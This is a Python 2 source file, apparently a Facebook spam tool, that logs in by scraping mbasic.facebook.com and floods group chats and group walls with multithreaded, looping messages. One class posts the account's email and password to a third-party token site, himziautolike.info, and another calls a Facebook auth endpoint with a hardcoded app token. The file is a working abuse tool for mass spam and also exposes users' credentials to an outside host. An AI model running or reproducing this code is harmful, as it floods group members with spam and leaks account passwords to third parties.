#-*-coding:utf-8-*-
# Coded By Deray
'''
	 Rebuild Copyright Can't make u real programmer
'''
# Report Bug On My Other Sosmed
# instagram: @reyy05_
# facebook: https://facebook.com/achmad.luthfi.hadi.3

import bs4
import zlib
import json
import base64
import marshal
import getpass
import requests
from data import cache
from data.color import *
from data import language
import mechanize,sys,re,random,threading
cache.cleanCache()

# Nyobain Pake Requests :v

coli=0

class _spamMassal:
	def __init__(self):
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self._req=requests.Session()
		self._prepare()
		
	def _send(self,url,grupname,**kwargs):
		global coli
		req=self._req.post(url,data=kwargs).url
		if "send_success" in req:
			coli+=1
			print " | %s%s%s -> %s %s%smessage sent. %s"%(G,
			grupname,N,kwargs["body"],G,coli,N)
		else:
			print " | %s%s -> %s message not sent. %s"%(R,
			grupname,kwargs["body"],N)
		
	def _prepare(self):
		self._tar="https://mbasic.facebook.com/messages/t/{}"
		b=bs4.BeautifulSoup(
			self._req.get(
				"https://mbasic.facebook.com").text,
				features="html.parser"
		)
		for _submit in b("input"):
			if "login" in _submit["name"]:
				self.submit=_submit["value"]
		login=self._req.post("https://mbasic.facebook.com/login",
		data=
			{
				"email":self.config["email"],
				"pass":self.config["pass"],
				"login":self.submit}
		).url
		if "save-device" in login or "m_sess" in login:
			print("[%s*%s] Login Succcess."%(G,N))
			try:
				self.generateTargetList()
			except Exception as __errors__:
				print("%s[!]%s %s"%(R,N,__errors__))
				return self.generateTargetList()
		else:
			sys.exit("%s[!]%s Login Failed."%(R,N))
			
	def generateTargetList(self):
		self.list=open(raw_input("[%s#%s] Group Target List: "%(G,N))).read().splitlines()
		self.msg()
		
	def msg(self):
		self.message=raw_input("[%s*%s] message: "%(G,N)).split(",")
		if (self.message == ""):
			return self.msg()
		self.lup()
		
	def lup(self):

		while True:
			for lists in self.list:
				try:
					jq=[]
					for x in range(10):
						t=threading.Thread(
						target=self.findGroup,
						args=(lists,))
						jq.append(t)
					for t in jq:
						t.start()
					for t in jq:
						t.join()
				except:
					sys.exit("\n%s[%s+%s]%s Finished"%(C,R,C,N))
			self.list=self.list
		
	def findGroup(self,id):
		self._dtsg=[]
		self.action=""
		grupname=[]
		bs=bs4.BeautifulSoup(
			self._req.get(self._tar.format(id)).text,
			features="html.parser"
		)
		for x in bs("form"):
			if "/messages/send/" in x["action"]:
				self.action="https://mbasic.facebook.com"+x["action"]
				grupname.append(
				bs.find("title").renderContents())
				break
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					self._dtsg.append(x["value"])
				if "jazoest" in x["name"]:
					self._dtsg.append(x["value"])
				if "send" in x["name"]:
					self._dtsg.append(x["value"])
					continue
				if "tids" in x["name"]:
					self._dtsg.append(x["value"])
			except:pass
				
		self._send(self.action,grupname[0],
			fb_dtsg=self._dtsg[0],
			jazoest=self._dtsg[1],
			body=random.choice(self.message),
			send=self._dtsg[2],
			tids=self._dtsg[3]
		)


'''
	single group spammer ^^
'''

class _grupSpammer():
	def __init__(self):
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.login()
		
	def login(self):
		self.br=mechanize.Browser()
		self.br.set_handle_robots(False)
		self.br.set_handle_equiv(True)
		self.br.set_handle_redirect(True)
		self.br.set_handle_referer(True)
		self.br.addheaders = [
			(
				"User-Agent","Mozilla/0.1 (Linux Android)"
			)
		]
		self.br.open("https://mbasic.facebook.com")
		self.br._factory.is_html=True
		self.br.select_form(nr=0)
		self.br.form["email"]="{}".format(self.config["email"])
		self.br.form["pass"]="{}".format(self.config["pass"])
		self.br.submit()
		if "save-device" in self.br.geturl():
			print("[%s*%s] Login Succcess"%(G,N))
			self.br.open("https://mbasic.facebook.com/messages/t/{}".format(
			raw_input("[%s#%s] Group ID: "%(G,N))))
			grup=re.findall('<head><title>(.*?)</title>',
			self.br.response().read())
			if len(grup) !=0:
				print("[%s*%s] Group Name: %s%s%s"%(G,N,R,grup[0],N))
				try:
					self.lp=input("[%s*%s] Loop: "%(G,N))
				except:
					sys.exit("%s[!]%s input number to spam."%(R,N))
				print("[%s*%s] Use Sparate , (coma) to random msg: ts,spm"%(R,N))
				self.ms=raw_input("[%s*%s] Message: "%(G,N)).split(",")
				self.spam()
			else:
				sys.exit("%s[!]%s Unknown Group ID"%(R,N))
				
		else:
			sys.exit("%s[!]%s Login failed."%(R,N))
	def spam(self):

		for x in range(1,self.lp):
			msg=random.choice(self.ms)
			try:
				self.br._factory.is_html=True
				self.br.select_form(nr=1)
				self.br.form["body"]="%s"%(msg)
				self.br.submit()
			except:
				sys.exit("%s[:'(] oh bro, can't send messages.%s"%(R,N))
			if msg in self.br.response().read():
				print " | %s%s -> %smessage sent.%s"%(G,msg,x,N)
			else:
				print " | %s%s -> %snot sent.%s"%(R,msg,x,N)
		print("%s[%s+%s]%s Finished."%(C,R,C,N))
		

import bs4
import json,re
import requests
import mechanize
import interpreter
from data.color import *
from multiprocessing.pool import ThreadPool

class spammas(object):
	def __init__(self):
		self.wal=[]
		self.req=requests.Session()
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://mbasic.facebook.com/{}"
		self.mbasic()
		
	def mbasic(self):
		s=self.req.post(self.i.format("login"),
			data=
				{
					"email":self.config["email"],
					"pass":self.config["pass"]
				}
		).url
		if "save-device" in s or "m_sess" in s:
			language.lang(self.req,
				self.i.format("language.php"))
			self.Dump(self.i.format("groups/?seemore"))
		else:exit("%s[!]%s login failed."%(R,N))
		
		
	def Dump(self,url):
		s=bs4.BeautifulSoup(self.req.get(url).text,
			features="html.parser")
		print 
		for x in s.find_all("a",href=True):
			if "/groups/" in x["href"]:
				if "category" in x["href"] or "create" in x["href"]:
					continue
				f=re.findall("/groups/(.*?)\?",x["href"])
				if len(f) !=0:
					self.wal.append(f[0])
						
		if len(self.wal) !=0:
			self.msg()
		else:
			print("%s[!]%s No Result Group Detected.\n"%(R,N))		
		
	def msg(self):
		self.mes=raw_input(
			"%s[?]%s message: "%(G,N))
		if self.mes =="":
			self.msg()
		print "%s[*]%s sending %s groups ..."%(G,N,len(self.wal))
		print 
		map(self.dump,self.wal)
				
	def dump(self,id):
		data=[]
		bs=bs4.BeautifulSoup(
			self.req.get(self.i.format("groups/"+id)).text,
		features="html.parser")
		title=bs.find("title").text
		print("%s[*]%s Name  : %s..."%(G,N,title[0:20]))
		for x in bs("form"):
			if "composer" in x["action"]:
				data.append(self.i.format(x["action"]))
				
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
				if "target" in x["name"]:
					data.append(x["value"])
					break
			except:pass
		if len(data) ==4:
			self.req.post(
			data[0],
				data=
					{
						"fb_dtsg":data[1],
						"jazoest":data[2],
						"target":data[3],
						"c_src":"group",
						"cwevent":"composer_entry",
						"referrer":"group",
						"ctype":"inline",
						"cver":"amber",
						"xc_message":self.mes,
						"view_post":"Kirim"
					}
			)
			print("%s[*]%s URL   : facebook.com/groups/%s"%(G,N,id))
			print("%s[*]%s Status: Success.\n"%(G,N))
		else:
			print("%s[*]%s URL   : facebook.com/groups/%s"%(G,N,id))
			print("%s[*]%s Status: Failed.\n"%(R,N))
				


# single


class single:
	def __init__(self):
		self.token=""
		self.i="https://mbasic.facebook.com/{}"
		self.k="https://graph.facebook.com/{}"
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.req=requests.Session()
		self.gq()
		
	def gq(self):
		self.grp=raw_input("%s[?]%s group query: "%(G,N))
		if self.grp =="":
			return self.gq()
		self.log()
		
	def log(self):
		koala=[]
		print("%s[*]%s please wait ..."%(G,N))
		p=bs4.BeautifulSoup(
		requests.post(
			"https://himziautolike.info/token.php",
		data=
			{
				"u":self.config["email"],
				"p":self.config["pass"],
				"login":"Generate Access Token"
			}
		).text,features="html.parser")
		for x in p.find_all("iframe"):
			try:
				self.token=requests.get(
					x["src"]).json()["access_token"]
			except Exception as f:
				exit("%s[!]%s failed when generate access token"%(R,N))
		for x in requests.get(self.k.format(
			"me/groups?access_token=%s"%(
				self.token))).json()["data"]:
			if self.grp.lower() in x["name"].lower():
				koala.append(x["id"])
				print("%s. %s"%(len(koala),x["name"].lower()))
		if len(koala) ==0:
			print "%s[!]%s no result: %s"%(R,N,self.grp)
			return self.gq()
		self.lup()
		self.loops(koala)
		
	def loops(self,koala):
		try:
			self.rrr=input("%s[?]%s loop: "%(G,N))
		except Exception as f:
			print "%s[!]%s %s"%(R,N,f)
			return self.loops(koala)
		self.into(koala)
	
	def lup(self):
		try:
			self.l=input("\n%s[?]%s select number: "%(G,N))
		except Exception as f:
			print "%s[!]%s %s"%(G,N,f)
			return self.lup()
			
	def into(self,koala):
		s=self.req.post(self.i.format("login"),
			data=
				{
					"email":self.config["email"],
					"pass":self.config["pass"]
				}
		).url
		if "save-device" in s or "m_sess" in s:
			self.psn(koala)
		else:exit("%s[!]%s login failed."%(R,N))
		
	def psn(self,koala):
		print("%s[*]%s <s> for space."%(G,N))
		self.msg=raw_input("%s[?]%s mesage: "%(G,N)).replace("<s>","\n")
		if self.msg =="":
			return self.psn(koala)
		print 
		for x in range(self.rrr):
			self.pr(koala[self.l-1])
		raw_input("press enter to menu ...")
		interpreter.ASU()
	def pr(self,me):
		data=[]
		bs=bs4.BeautifulSoup(
			self.req.get(self.i.format("groups/"+me)).text,
		features="html.parser")
		for x in bs("form"):
			if "composer" in x["action"]:
				data.append(self.i.format(x["action"]))
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
				if "target" in x["name"]:
					data.append(x["value"])
				if "c_src" in x["name"]:
					data.append(x["value"])
				if "cwevent" in x["name"]:
					data.append(x["value"])
				if "referrer" in x["name"]:
					data.append(x["value"])
				if "ctype" in x["name"]:
					data.append(x["value"])
				if "cver" in x["name"]:
					data.append(x["value"])
				if "view_post" in x["name"]:
					data.append(x["value"])
					break
			except:pass
		if len(data) ==10:
			self.req.post(data[0],
			data=
				{
					"fb_dtsg":data[1],
					"jazoest":data[2],
					"target":data[3],
					"c_src":data[4],
					"cwevent":data[5],
					"referrer":data[6],
					"ctype":data[7],
					"cver":data[8],
					"xc_message":self.msg,
					"view_post":data[9]
				}
			)
			print "%s[*]%s %s -> SUCCESS"%(G,N,
				bs.find("title").renderContents())
			print "%s[*]%s URL: %s"%(G,N,self.i.format("groups/"+me).replace("https://",""))
			print "-"*50
			print 
			
class spamGroups(object):
	def __init__(self):
		self.counter=0
		self.id=[]
		self.req=requests.Session()
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://mbasic.facebook.com/{}"
		self.lg()
		
	def lg(self):
		s=self.req.post(self.i.format("login"),
			data={
				"email":self.config["email"],
				"pass":self.config["pass"]
			}
		).url
		if "save-device" in s or "m_sess" in s:
			self.input()
		else:exit("%s[!]%s login failed."%(R,N))
		
	def input(self):
		self.q=raw_input("%s[?]%s group query: "%(
			G,N)).lower()
		if self.q =="":
			return self.input()
		else:
			self.moncong()
			
	def moncong(self):
		self.r=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(self.config["email"],self.config["pass"])).json()
		try:
			self.token=self.r["access_token"]
		except:
			exit("%s[!]%s failed when generate access token."%(R,N))
		print 
		for x in self.req.get("https://graph.facebook.com/me/groups?access_token=%s"%(self.token)).json()["data"]:
			if self.q in x["name"].lower():
				self.id.append(x["id"])
				print("%s. %s"%(len(self.id),
					x["name"].lower().replace(self.q,"%s%s%s"%(R,self.q,N))))
		if len(self.id) ==0:
			print("%s[!]%s no result."%(R,N))
			return self.input()
		else:
			self.inum()
			
	def inum(self):
		try:
			self.n=input("\n%s[?]%s select number: "%(G,N))
		except Exception as e:
			print("%s[!]%s %s"%(R,N,e))
			return self.inum()
		self.lop(self.id[self.n-1])
		
	def lop(self,id):
		bz=bs4.BeautifulSoup(
			self.req.get(self.i.format(id)).text,
		features="html.parser")
		self.target=bz.find("title").text
		print("%s[*]%s target   : %s"%(G,N,self.target))
		self.pul(id)
		
	def pul(self,id):
		try:
			self.l=input("%s[?]%s loop     : "%(G,N))
		except Exception as e:
			print("%s[!]%s %s"%(R,N,e))
			return self.pul(id)
		print("%s[*]%s use coma (,) to random messages."%(R,N))
		self.msg(id)
		
	def msg(self,id):
		self.id=id
		self.m=raw_input("%s[?]%s msg      : "%(G,N)).split(",")
		if self.m =="":
			return self.msg(id)
		
		pool=[]
		for i in range(self.l):
			pool.append(i)
		p=ThreadPool(10)
		p.map(self.run,pool)
		print("\nfinished.")
		
	def run(self,pool):
		datas=[]
		s=bs4.BeautifulSoup(
			self.req.get(self.i.format(self.id)).text,
		features="html.parser")
		for x in s("form"):
			if "composer" in x["action"]:
				datas.append(self.i.format(x["action"]))
		for x in s("input"):
			try:
				if "fb_dtsg" in x["name"]:
					datas.append(x["value"])
				if "jazoest" in x["name"]:
					datas.append(x["value"])
				if "target" in x["name"]:
					datas.append(x["value"])
				if "c_src" in x["name"]:
					datas.append(x["value"])
				if "cwevent" in x["name"]:
					datas.append(x["value"])
				if "referrer" in x["name"]:
					datas.append(x["value"])
				if "ctype" in x["name"]:
					datas.append(x["value"])
				if "cver" in x["name"]:
					datas.append(x["value"])
				if "view_post" in x["name"]:
					datas.append(x["value"])
					break
			except:pass
		self.req.post(datas[0],
			data=
				{
					"fb_dtsg":datas[1],
					"jazoest":datas[2],
					"target":datas[3],
					"c_src":datas[4],
					"cwevent":datas[5],
					"referrer":datas[6],
					"ctype":datas[7],
					"cver": datas[8],
					"xc_message":random.choice(self.m),
					"view_post":datas[9]
				}
		).text
		self.counter+=1
		print("\r%s[+]%s sending spam %s/%s"%(
			G,N,self.counter,self.l)),;sys.stdout.flush()
				
		



